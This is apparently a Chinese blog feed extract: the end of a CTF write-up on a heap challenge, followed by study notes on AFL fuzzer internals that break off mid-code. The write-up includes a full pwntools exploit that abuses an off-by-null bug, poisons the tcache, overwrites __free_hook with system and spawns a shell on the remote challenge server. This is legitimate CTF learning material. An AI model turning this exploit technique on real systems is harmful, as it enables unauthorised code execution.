<p>可以申请最多17个堆块，大小范围在 0xFF~0x3FF之间，记录堆块地址以及堆块大小。</p>
<p><img src="/2022/08/25/2022-08-25-2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/image-20220831204112120.png"><span class="image-caption">image-20220831204112120</span></p>
<p><img src="/2022/08/25/2022-08-25-2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/image-20220831204103067.png"><span class="image-caption">image-20220831204103067</span></p>
<p>这里的输入完内容后执行的函数存在问题：填满堆块时，如果下一个堆块的size存在0x11结尾，将会被置0，可看为offbynull。</p>
<p><img src="/2022/08/25/2022-08-25-2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/image-20220831204253467.png"><span class="image-caption">image-20220831204253467</span></p>
<p>只能打印fd上的内容。</p>
<p><img src="/2022/08/25/2022-08-25-2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/image-20220831204329537.png"><span class="image-caption">image-20220831204329537</span></p>
<p>正常释放堆块，且置0。</p>
<p>显然是要利用offbynull构造堆块重叠，从而泄露地址以及错位修改fd指针，达到任意地址写的目的。</p>
<p><img src="/2022/08/25/2022-08-25-2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/image-20220831205009734.png"><span class="image-caption">image-20220831205009734</span></p>
<p>先填充 tcache bin，0x210作为我们的目标堆块。</p>
<p><img src="/2022/08/25/2022-08-25-2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/image-20220831205340121.png"><span class="image-caption">image-20220831205340121</span></p>
<p>然后在目标堆块里面，把减少的0x11伪造为一个堆块，保持堆块的连续性。</p>
<p><img src="/2022/08/25/2022-08-25-2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/image-20220831205604626.png"><span class="image-caption">image-20220831205604626</span></p>
<p>接着，填充前一个堆块，修改目标堆块的size位。</p>
<p><img src="/2022/08/25/2022-08-25-2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/image-20220831205808341.png"><span class="image-caption">image-20220831205808341</span></p>
<p><img src="/2022/08/25/2022-08-25-2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/image-20220831210100052.png"><span class="image-caption">image-20220831210100052</span></p>
<p>在将prev size位修改为前几个堆块的总和size，最后释放合并，覆盖堆块就完成了。顺带提一嘴，这样在2.27前还能利用成功，在2.29及以上，就会失败了，程序会去检查头堆块的size是否有prev size这么大。</p>
<p>接下来就是泄露地址，然后错位修改堆块的fd指针，就做完了。</p>
<p><img src="/2022/08/25/2022-08-25-2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/QQ%E5%9B%BE%E7%89%8720220817194519.png"><span class="image-caption">QQ图片20220817194519</span></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./smallcontainer&#x27;</span>)<br>DEBUG = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> DEBUG:<br>    libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/tools/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so&quot;</span>)<br>    ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/tools/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/ld-2.27.so&quot;</span>)<br>    p = process(argv=[ld.path,elf.path], env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-keyword">else</span>:<br>    ip = <span class="hljs-string">&#x27;101.200.85.91&#x27;</span><br>    port = <span class="hljs-number">37238</span><br>    libc = ELF(<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>)<br>    p = remote(ip, port)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>(<span class="hljs-params">info=<span class="hljs-string">&quot;b main&quot;</span></span>):</span><br>	gdb.attach(p, info)<br>	<span class="hljs-comment">#gdb.attach(p, &quot;b *$rebase(0x)&quot;)</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>    p.sendlineafter(<span class="hljs-string">b&quot;&gt; &quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Input size: &quot;</span>)<br>    p.send(<span class="hljs-built_in">str</span>(size).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br>	<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendlineafter(<span class="hljs-string">b&quot;&gt; &quot;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Input index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendlineafter(<span class="hljs-string">b&quot;&gt; &quot;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Input index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx, content</span>):</span><br>    p.sendlineafter(<span class="hljs-string">b&quot;&gt; &quot;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Input index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br>    p.send(content)<br><br><br>add(<span class="hljs-number">0x1f8</span>)<br>add(<span class="hljs-number">0x1f8</span>)<br>add(<span class="hljs-number">0x1f8</span>)<br>add(<span class="hljs-number">0x208</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>,<span class="hljs-number">11</span>):<br>    add(<span class="hljs-number">0x1f8</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>,<span class="hljs-number">11</span>):<br>    free(i)<br>edit(<span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x1f0</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x11</span>))<br>edit(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x1f8</span>)<br>edit(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x1f0</span> + p64(<span class="hljs-number">0x600</span>))<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">0x100</span>)<br>show(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#p.recvuntil(&quot;0x&quot;)</span><br>leak = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0x3ec190</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %leak)<br>free_hook = leak + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>sys = leak + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>add(<span class="hljs-number">0x310</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0x1f8</span>)<br>free(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">3</span> ,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xd8</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x201</span>) + p64(free_hook))<br>add(<span class="hljs-number">0x1f8</span>)<br>add(<span class="hljs-number">0x1f8</span>)<br>edit(<span class="hljs-number">11</span>, p64(sys))<br>free(<span class="hljs-number">3</span>)<br><span class="hljs-comment">#debug()</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="happy-note"><a href="#happy-note" class="headerlink" title="happy_note"></a>happy_note</h2>]]></content>
  </entry>
  <entry>
    <title>天问之路</title>
    <url>/2022/07/19/2022-07-20-%E5%A4%A9%E9%97%AE%E4%B9%8B%E8%B7%AF%E2%80%94%E2%80%94Fuzz/</url>
    <content><![CDATA[<h1 id="AFL"><a href="#AFL" class="headerlink" title="AFL"></a>AFL</h1><h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">常用参数<br>-i  <span class="hljs-comment">#指定测试样本的路径</span><br><span class="hljs-regexp">/home/</span>shoucheng<span class="hljs-regexp">/AFLcpp/</span>AFLcpp<span class="hljs-regexp">/debug/</span>fuzz_input<br>-o  <span class="hljs-comment">#指定输出结果的路径</span><br><span class="hljs-regexp">/home/</span>shoucheng<span class="hljs-regexp">/AFLcpp/</span>AFLcpp<span class="hljs-regexp">/debug/</span>fuzz_output<br>-m  <span class="hljs-comment">#最大内存，默认单位为 MB</span><br>none  <span class="hljs-comment">#表示无上限</span><br>-t  <span class="hljs-comment">#设置程序运行超时值，单位为 ms</span><br><span class="hljs-number">500</span>+<br>--  <span class="hljs-comment">#无意义分隔符号</span><br><span class="hljs-regexp">/home/</span>shoucheng<span class="hljs-regexp">/xxx/</span>xxx  <span class="hljs-comment">#执行程序的路径</span><br>@@  <span class="hljs-comment">#表示读文件得到的输入，没有@@则表示从标准输入读取输入</span><br><br>其他参数<br>-M  <span class="hljs-comment">#运行主(Master) Fuzzer</span><br>-S  <span class="hljs-comment">#运行从属(Slave) Fuzzer</span><br>-f  <span class="hljs-comment">#fuzz的目标文件</span><br>-x  <span class="hljs-comment">#额外目录（暂时不懂什么意思）</span><br>-b  <span class="hljs-comment">#绑定一个空闲的CPU core</span><br>-d  <span class="hljs-comment">#跳过确定性阶段</span><br>-B  <span class="hljs-comment">#复用之前已生成过的fuzz_bitmap </span><br>-C  <span class="hljs-comment">#crash模式</span><br>-n  <span class="hljs-comment">#dumb mode 无仪器模式</span><br>-T  <span class="hljs-comment">#显示banner(banner指哪个暂时不懂)</span><br>-Q  <span class="hljs-comment">#qume模式</span><br>-V  <span class="hljs-comment">#打印版本号</span><br></code></pre></td></tr></table></figure>

<h2 id="数据类型说明"><a href="#数据类型说明" class="headerlink" title="数据类型说明"></a>数据类型说明</h2><figure class="highlight angelscript"><table><tr><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">typedef</span> <span class="hljs-built_in">int</span>8_t   s8;<br><span class="hljs-keyword">typedef</span> <span class="hljs-built_in">int</span>16_t  s16;<br><span class="hljs-keyword">typedef</span> <span class="hljs-built_in">int</span>32_t  s32;<br><span class="hljs-keyword">typedef</span> <span class="hljs-built_in">int</span>64_t  s64;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-built_in">uint</span>8_t  u8;<br><span class="hljs-keyword">typedef</span> <span class="hljs-built_in">uint</span>16_t u16;<br><span class="hljs-keyword">typedef</span> <span class="hljs-built_in">uint</span>32_t u32;<br><span class="hljs-keyword">typedef</span> <span class="hljs-built_in">uint</span>64_t u64;<br></code></pre></td></tr></table></figure>

<h2 id="afl-gcc"><a href="#afl-gcc" class="headerlink" title="afl-gcc"></a>afl-gcc</h2><p><code>afl-gcc</code>实质上是对<code>gcc</code>或<code>clang</code>的封装（<code>wrapper</code>），它在编译的命令行参数中加入了一定的参数并调用<code>gcc</code>或<code>clang</code>实现对于关键节点的代码插桩，编译生成汇编代码，从而记录程序执行路径之类的关键信息，对程序的运行情况进行反馈。</p>
<h3 id="核心函数"><a href="#核心函数" class="headerlink" title="核心函数"></a>核心函数</h3><h4 id="find-as"><a href="#find-as" class="headerlink" title="find_as"></a>find_as</h4><p>查找 afl-as 的具体位置。</p>
<ul>
<li>首先尝试从环境变量中获取 AFL_PATH ，如果存在就赋值给 afl_path，然后检查 <code>afl_path</code> 拼接上<code>/as</code>的文件是否可以执行，如果可以执行，那么将该路径赋值给 as_path。</li>
<li>如果不存在 AFL_PATH 这个环境变量，则检查 argv0，例如（”~/AFL/afl-gcc”）中是否存在 ‘/‘，如果有就找到最后一个 ‘/‘ 所在的位置，并取其前面的字符串作为 dir，然后检查<code>dir</code>拼接上<code>/afl-as</code>的文件是否可以执行，如果可以执行，那么将该路径赋值给 as_path。</li>
<li>如果上述两种方式都失败，则抛出异常。</li>
</ul>
<h4 id="edit-params"><a href="#edit-params" class="headerlink" title="edit_params"></a>edit_params</h4><p>将 <code>argv</code> 拷贝到 <code>u8 **cc_params</code>，然后进行相应的处理。</p>
<ul>
<li>首先通过 ck_alloc 来为 cc_params 分配内存，分配的长度为<code>(argc+128)*8</code>。</li>
<li>然后检查 argv[0] 是否存在 ‘/‘ ，如果不存在就 argv[0] 赋值 给 name，如果存在就找到最后一个 ‘/‘ 所在的位置，将 ‘/‘ 后面的字符串赋值给 name。</li>
<li>比较 name 和 afl-clang：<ul>
<li>如果相同，则设置 clang_mode 为 1 ，然后设置环境变量 CLANG_ENV_VAR 为 1。<ul>
<li>然后比较 name 和 afl-clang++：<ul>
<li>如果相同，则获取环境变量<code>AFL_CXX</code>的值，如果该值存在，则将 cc_params[0] 设置为该值，如果不存在，就设置为 clang++。</li>
<li>如果不相同，则获取环境变量<code>AFL_CC</code>的值，如果该值存在，则将 cc_params[0] 设置为该值，如果不存在，就设置为 clang。</li>
</ul>
</li>
</ul>
</li>
<li>如果不相同，则比较 name 和 afl-g++：<ul>
<li>如果相同，则获取环境变量<code>AFL_CXX</code>的值，如果该值存在，则将 cc_params[0] 设置为该值，如果不存在，就设置为 g++。</li>
<li>如果不相同，则比较 name 和 afl-gcj，相同，则获取环境变量<code>AFL_GCJ</code>的值，如果该值存在，则将 cc_params[0] 设置为该值，如果不存在，就设置为 gcj。</li>
<li>如果不相同，则获取环境变量<code>AFL_CC</code>的值，如果该值存在，则将 cc_params[0] 设置为该值，如果不存在，就设置为 gcc。</li>
</ul>
</li>
</ul>
</li>
<li>进入 while 循环，遍历从 argv[1] 开始的 argv 参数：<ul>
<li>如果存在 <code>-B/integrated-as/-pipe</code>，直接跳过。</li>
<li>如果存在<code>-fsanitize=address</code>或者<code>-fsanitize=memory</code>，设置 asan_set 为 1。用于告诉 gcc 要检查内存访问的错误，比如数组越界之类。</li>
<li> 如果存在 <code>FORTIFY_SOURCE</code>，设置 fortify_set 为 1。主要用于进行缓冲区溢出问题的检查，检查的常见函数有<code>memcpy, mempcpy, memmove, memset, strcpy, stpcpy, strncpy, strcat, strncat, sprintf, vsprintf, snprintf, gets</code> 等。</li>
<li>最后对 <code>cc_params</code>进行赋值 <code>cc_params[cc_par_cnt++] = cur</code></li>
</ul>
</li>
<li>然后开始设置其他的 cc_params 参数<ul>
<li>取之前计算出来的<code>as_path</code>，然后设置<code>-B as_path</code>,<code>-B</code>选项用于设置编译器的搜索路径。</li>
<li>如果是 clang_mode 为 1，则设置<code>-no-integrated-as</code></li>
<li>如果存在 AFL_HARDEN 环境变量，则设置<code>-fstack-protector-all</code>，并且如果没有设置 fortify_set，则追加 <code>-D_FORTIFY_SOURCE=2</code></li>
<li>sanitizer<ul>
<li>如果 asan_set 在上面被设置为 1，则将环境变量<code>AFL_USE_ASAN</code>赋值为 1。</li>
<li>如果 asan_set 没有被设置为 1，但存在 AFL_USE_ASAN 环境变量，则设置<code>-U_FORTIFY_SOURCE -fsanitize=address</code></li>
<li>如果不存在 AFL_USE_ASAN 环境变量，但存在 AFL_USE_MSAN 环境变量，则设置<code>U_FORTIFY_SOURCE -fsanitize=memory</code></li>
<li>不能同时指定<code>AFL_USE_ASAN</code>或者<code>AFL_USE_MSAN</code>，也不能同时指定 <code>AFL_USE_MSAN</code> 和 <code>AFL_HARDEN</code>，因为这样运行时速度过慢</li>
</ul>
</li>
<li>如果不存在 AFL_DONT_OPTIMIZE 环境变量，则设置<code>-g -O3 -funroll-loops -D__AFL_COMPILER=1 -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1</code></li>
<li>如果存在 AFL_NO_BUILTIN 环境变量，表示允许进行优化，则设置<code>-fno-builtin-strcmp</code>等</li>
</ul>
</li>
<li>最后<code>cc_params[cc_par_cnt] = NULL;</code>终止对 cc_params 的编辑</li>
</ul>
<h4 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h4><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; *(cc_params + i) != <span class="hljs-literal">NULL</span>; i++) &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\targ%d: %s\n&quot;</span>, i, cc_params[i]);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>添加一行打印代码，打印出 afl-gcc 编译使用的参数。</p>
<p><img src="/2022/07/19/2022-07-20-%E5%A4%A9%E9%97%AE%E4%B9%8B%E8%B7%AF%E2%80%94%E2%80%94Fuzz/image-20230217195528090.png"><span class="image-caption">image-20230217195528090</span></p>
<p>参数如下：</p>
<p><img src="/2022/07/19/2022-07-20-%E5%A4%A9%E9%97%AE%E4%B9%8B%E8%B7%AF%E2%80%94%E2%80%94Fuzz/image-20230217195540657.png"><span class="image-caption">image-20230217195540657</span></p>
<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>总结来说，<code>afl-gcc</code>是对<code>gcc</code>的一层封装，主要是在相应的编译选项中加入<code>-B</code>参数（也加入一些必要的参数和优化的参数），指定特定的编译器搜索路径，最终 <code>gcc</code> 进行编译时，会调用<code>afl-as</code>来进行汇编。</p>
<h2 id="afl-as"><a href="#afl-as" class="headerlink" title="afl-as"></a>afl-as</h2><h3 id="核心函数-1"><a href="#核心函数-1" class="headerlink" title="核心函数"></a>核心函数</h3><h4 id="edit-params-1"><a href="#edit-params-1" class="headerlink" title="edit_params"></a>edit_params</h4><p>在 gcc 中，<code>.s</code>文件是最后一个参数，因此该函数作用是正常保存其他参数，设置好系统类型，以及对最后一个参数——汇编文件路径进行相应的修改，便于后续对原有的汇编文件进行插桩。</p>
<ul>
<li>依次检查是否存在 TMPDIR/TEMP/TMP 等环境变量，存在则将其值赋给 tmp_dir，如果都不存在则把 ‘/tmp’ 赋值给 tmp_dir。</li>
<li>为 as_pramas 申请大小为 (argc + 32) * 8 的内存空间。</li>
<li>检查是否存在环境变量 AFL_AS，若存在则将其值赋给 afl_as，否则设置 afl_as 为 ‘as’  </li>
<li>设置 as_params[argc] 为 0，as_par_cnt 初始值为1</li>
<li>从 argv[1] 开始遍历到 argv[argc-1]：<ul>
<li>如果存在字符串 <code>--64</code>， 则设置 use_64bit = 1；如果存在字符串 <code>--32</code> ，则设置 use_64bit = 0。对于<code>__APPLE__</code> ，如果存在 <code>-arch x86_64</code>，设置 use_64bit = 1，并跳过 -q 和 -Q 选项；</li>
<li><code>as_params[as_par_cnt++] = argv[i];</code> 设置 as_params 的值为 argv 对应的参数值。</li>
</ul>
</li>
<li>开始设置其他的参数<ul>
<li>对于<code>__APPLE__</code>，如果设置了 use_clang_as 为 1，则设置 <code>-c -x assembler</code>参数。</li>
<li>将 argv[argc - 1] 赋值给  input_file。<ul>
<li> 如果 input_file 的首字符为 ‘-‘，是 ‘-version’ 则设置 just_version = 1，modified_file = input_file，然后跳转到 wrap_things_up，说明只是为了显示 version 信息，如果不是 ‘-version’ 则抛出异常。</li>
<li>如果 input_file 首字符不为 ‘-‘，比较 input_file 与 tmp_dir、’/var/tmp’、’/tmp’ 的前 strlen(tmp_dir)/9/5个字节是否相同，如果不相同，则设置 pass_thru 为 1。</li>
<li>设置 modified_file 的值为<code>alloc_printf(&quot;%s/.afl-%u-%u.s&quot;, tmp_dir, getpid(),(u32) time(NULL));</code>，即<code>tmp_dir/.afl-pid-time.s</code>格式的字符串。</li>
<li>设置<code>as_params[as_par_cnt++] = modified_file</code>。</li>
<li><code>as_params[as_par_cnt] = NULL</code>。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="add-instrumentation"><a href="#add-instrumentation" class="headerlink" title="add_instrumentation"></a>add_instrumentation</h4><p>处理输入文件，生成 modified_file，将 instrumentation 插入所有适当的位置。</p>
<ul>
<li><p>如果 input_file 不为空，则尝试以流形式打开，成功则将 FILE* 指针赋值给 inf，失败则抛出异常；如果 input_file 为空，则将 stdin 赋值给 inf。</p>
</li>
<li><p>用创建写打开 modified_file 对应的文件，并获取其句柄 outfd，再根据句柄通过 fdopen 函数转换为 FILE* 指针 outf。</p>
</li>
<li><p>while 循环通过 fgets 从 inf 中逐行读取内容保存到 line 数组里，每行最多读取的字节数是 MAX_LINE(8192)，这个值包括 ‘\0’，所以实际读取的有内容的字节数是 MAX_LINE - 1 个字节。</p>
<ul>
<li><p>对于读入的每一行，先判断插桩的条件是否满足（<code>!pass_thru &amp;&amp; !skip_intel &amp;&amp; !skip_app &amp;&amp; !skip_csect &amp;&amp; instr_ok &amp;&amp; instrument_next &amp;&amp; line[0] == &#39;\t&#39; &amp;&amp; isalpha(line[1]</code>），如果满足则直接往 outf 插入插桩代码（<code>trampoline_fmt_64</code> 或<code>trampoline_fmt_32</code>，根据是<code>32</code>位还是<code>64</code>位），插桩完成后，表明该基本块已经完成插桩，后面的代码无需插桩，将<code>instrument_next</code>置位<code>0</code>，并将插桩计数器<code>ins_lines</code>加一。</p>
<ul>
<li><code>pass_thru</code>标志位是在<code>edit_params</code>中设定的。</li>
<li><code>skip_intel</code>用来标志跳过 intel 汇编语法。</li>
<li><code>skip_app</code>用来标志跳过<code>ad-hoc __asm__</code>（内联汇编）。</li>
<li><code>skip_csect</code>则是用来标志<code>off-flavor assembly</code>。</li>
<li><code>instr_ok</code>用来标志是否需要插桩。</li>
<li><code>instrument_next</code>用来标志后续的代码是否还需要插桩。</li>
</ul>
</li>
<li><p>把 line 数组里的读取内容写入到 outf 对应的文件里。</p>
</li>
<li><p>如果 pass_thru 为 1，直接跳过插桩。</p>
</li>
<li><p>如果 line 的值是<code>\t.[text\n|section\t.text|section\t__TEXT,__text|section __TEXT,__text]...</code>其中之一，则设置 instr_ok 为 1，然后开始新的 while 循环，去读取下一行的数据到 line 数组里。</p>
</li>
<li><p>如果 line 的值是 <code>\t.[section\t|section |bss\n|data\n]...</code>其中之一，则设置 instr_ok 为 0，然后开始新的 while 循环，去读取下一行的数据到 line 数组里。</p>
</li>
<li><p>然后进行设置 skip_csect 、 skip_intel 、skip_app 等标志的值。</p>
</li>
<li><p>```c</p>
<pre><code>^main:      - function entry point (always instrumented)
^.L0:       - GCC branch label
^.LBB0_0:   - clang branch label (but only in clang mode)
^\tjnz foo  - conditional branches
   /* 对于 main 函数的入口（^main:）需要插桩，因为需要初始化；
      对于分支条件的标签后面（gcc是^.L0:，clang是^.LBB0_0:）需要插桩，因为它是条件跳转的目标地址；
      对于跳转指令（^\tjnz foo）后面也需要插桩，因为该指令的后面形成了分支 */
 ...but not:

   ^# BB#0:    - clang comments
   ^ # BB#0:   - ditto
   ^.Ltmp0:    - clang non-branch labels
   ^.LC0       - GCC non-branch labels
   ^.LBB0_0:   - ditto (when in GCC mode)
   ^\tjmp foo  - non-conditional jumps
/* 而对于注释（^# BB#0:以及^ # BB#0:）不需要插桩；
   绝对跳转的目标地址（^.Ltmp0:、^.LC0以及^.LBB0_0:）不需要插桩，因为没有形成新的分支或路径；          绝对跳转指令（^\tjmp foo）也无需插桩。*/
</code></pre>
<figure class="highlight swift"><table><tr><td class="code"><pre><code class="hljs swift"><br>  <span class="hljs-operator">-</span> 因此后续代码检测指令是否为绝对跳转指令 jmp `line[<span class="hljs-number">1</span>] <span class="hljs-operator">==</span> &#x27;j&#x27; <span class="hljs-operator">&amp;&amp;</span> line[<span class="hljs-number">2</span>] <span class="hljs-operator">!=</span> &#x27;m&#x27;`，如果不是则在该指令的后面直接插入插桩代码<span class="hljs-operator">。</span>inst_ratio 是我们之前设置的插桩密度，默认值为 <span class="hljs-number">100</span>，如果设置了 asan 之类的就会默认设置成 <span class="hljs-number">33</span> ；并将插桩计数器`ins_lines`加一；然后开始新的 <span class="hljs-keyword">while</span> 循环<span class="hljs-operator">。</span><br><br>  <span class="hljs-operator">-</span> 先检查 line 该行中是否存在`:`，然后检查是否以`.`开始<br><br>    <span class="hljs-operator">-</span> 如果以`.`开始，则表示想对`<span class="hljs-operator">^</span>.<span class="hljs-type">L0</span>:`或者`<span class="hljs-operator">^</span>.<span class="hljs-type">LBB0_0</span>:`这样的 branch label 进行插桩<span class="hljs-operator">。</span>判断依据是 line[<span class="hljs-number">2</span>] 是否为数字，或者在 clang 模式下，line[<span class="hljs-number">1</span>] 开始的三个字节是否为 <span class="hljs-type">LBB</span><span class="hljs-operator">。</span>然后将 instrument_next 置 <span class="hljs-number">1</span><span class="hljs-operator">。</span><br>    <span class="hljs-operator">-</span> 否则代表这是一个 function，插桩`<span class="hljs-operator">^</span><span class="hljs-function"><span class="hljs-keyword">func</span></span>:`function entry point，然后将 instrument_next 置 <span class="hljs-number">1</span><span class="hljs-operator">。</span><br><br>  <span class="hljs-operator">-</span> 如果插桩计数器 ins_lines 不为 <span class="hljs-number">0</span>，则最终依据架构，向 outf 写入插桩的主体功能代码 main_payload_64 或者 main_payload_32<span class="hljs-operator">。</span><br><br>  <span class="hljs-operator">-</span> 最后关闭 inf 和 outf<span class="hljs-operator">。</span><br><br> afl 的插桩过程十分简单，首先只对 .text 进行插桩，然后通过汇编的前导命令来判断是否是一个跳转分支或者一个函数，然后插入  `instrumentation trampoline`<span class="hljs-operator">。</span><br><br>#### main 函数<br><br><span class="hljs-operator">-</span> 读取环境变量 <span class="hljs-type">AFL_INST_RATIO</span> 的值，将其赋值给 inst_ratio_str<span class="hljs-operator">。</span><br><span class="hljs-operator">-</span> 设置 srandom 的随机种子为`rand_seed <span class="hljs-operator">=</span> tv.tv_sec <span class="hljs-operator">^</span> tv.tv_usec <span class="hljs-operator">^</span> getpid();`<br><span class="hljs-operator">-</span> 设置环境变量 <span class="hljs-type">AS_LOOP_ENV_VAR</span> 的值为 <span class="hljs-number">1</span><span class="hljs-operator">。</span><br><span class="hljs-operator">-</span> 读取环境变量 <span class="hljs-type">AFL_USE_ASAN</span> 和 <span class="hljs-type">AFL_USE_MSAN</span> 的值，如果其中有一个为 <span class="hljs-number">1</span>，则设置 sanitizer 为 <span class="hljs-number">1</span>，且将 inst_ratio 除以 <span class="hljs-number">3</span><span class="hljs-operator">。</span><br>  <span class="hljs-operator">-</span> 这是因为 <span class="hljs-type">AFL</span> 无法在插桩的时候识别出 <span class="hljs-type">ASAN</span> specific branches，所以会插入很多无意义的桩，为了降低这种概率，粗暴的将整个插桩的概率都除以<span class="hljs-number">3</span><br><span class="hljs-operator">-</span> edit_params(argc, argv)<br><span class="hljs-operator">-</span> add_instrumentation()<br><span class="hljs-operator">-</span> fork出一个子进程，让子进程来执行 `execvp(as_params[<span class="hljs-number">0</span>], (char <span class="hljs-operator">**</span>) as_params);`<br>  <span class="hljs-operator">-</span> 这是因为 execvp 执行的时候，会用`as_params[<span class="hljs-number">0</span>]`来完全替换掉当前进程空间中的程序，如果不通过子进程来执行实际的 <span class="hljs-keyword">as</span>，那么后续就无法在执行完实际的 <span class="hljs-keyword">as</span> 之后，还能 unlink 掉 modified_file<span class="hljs-operator">。</span><br><span class="hljs-operator">-</span> `waitpid(pid, <span class="hljs-operator">&amp;</span>status, <span class="hljs-number">0</span>)`等待子进程结束<br><span class="hljs-operator">-</span> 读取环境变量<span class="hljs-type">AFL_KEEP_ASSEMBLY的值，如果没有设置这个环境变量，就unlink掉modified_file</span><span class="hljs-operator">。</span><br><br>#### 小结<br><br>`afl<span class="hljs-operator">-</span><span class="hljs-keyword">as</span>`的主要功能是逐行对前面编译生成的汇编代码进行遍历，在恰当的位置插入相应的插桩代码（`trampoline_fmt`）并在最末尾插入相应的功能代码（`main_payload`），最终调用原生的`<span class="hljs-keyword">as</span>`来生成二进制文件，从而实现对二进制文件的插桩<span class="hljs-operator">。</span><br><br>#### instrumentation trampoline 和 main_payload<br><br>`trampoline_fmt_64<span class="hljs-operator">/</span><span class="hljs-number">32</span>`定义在 `afl<span class="hljs-operator">-</span><span class="hljs-keyword">as</span>.h` 头文件中，代码执行功能为保存好寄存器 rdx，rcx，rax(<span class="hljs-number">32</span>位多个 edi) 的值，rcx 取值设为随机数<span class="hljs-type">R</span>(<span class="hljs-type">MAP_SIZE</span>)，以此来区分每个分支点，显然最关键处在于 `__afl_maybe_log`<span class="hljs-operator">。</span><br><br>```c<br><span class="hljs-keyword">static</span> const u8<span class="hljs-operator">*</span> trampoline_fmt_32 <span class="hljs-operator">=</span><br><br>  <span class="hljs-string">&quot;<span class="hljs-subst">\n</span>&quot;</span><br>  <span class="hljs-string">&quot;/* --- AFL TRAMPOLINE (32-BIT) --- */<span 